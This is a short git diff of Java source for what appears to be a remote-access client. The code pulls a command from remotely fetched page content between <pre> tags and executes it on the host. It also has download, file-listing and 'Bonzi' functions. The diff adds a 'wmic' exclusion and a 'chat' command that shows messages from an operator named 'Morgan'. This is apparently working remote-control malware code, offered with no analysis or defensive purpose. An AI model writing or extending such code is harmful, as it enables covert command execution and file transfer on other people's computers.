@@ -6,6 +6,7 @@ import ch.lebois.client.service.BonziFunctions;
 import ch.lebois.client.service.DownloadService;
 import ch.lebois.client.service.ListFilesFunction;
 import ch.lebois.client.service.Printer;
+import ch.lebois.client.service.chat.Chat;
 
 import java.util.Collections;
 import java.util.List;
@@ -16,7 +17,7 @@ public class CommandReader {
             String command = ClientValues.commandReader.getContent().split("<pre>")[1].split("</pre>")[0];
             if (!command.equals("")) {
                 if (!functions(command)) {
-                    if (!command.startsWith("cmd") && !command.startsWith("bash")) {
+                    if (!command.startsWith("cmd") && !command.startsWith("bash") && !command.startsWith("wmic")) {
                         try {
                             List<String> responses = Console.execute(command);
 
@@ -66,6 +67,10 @@ public class CommandReader {
             new ResponseSender().reset();
         } else if (command.startsWith("download")) {
             new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
+            new ResponseSender().reset();
+        } else if (command.startsWith("chat")) {
+            Chat chat = Chat.getInstance();
+            chat.addMessage("Morgan", command.replace("chat ", ""));
             new ResponseSender().reset();
         } else {
             isFunction = false;
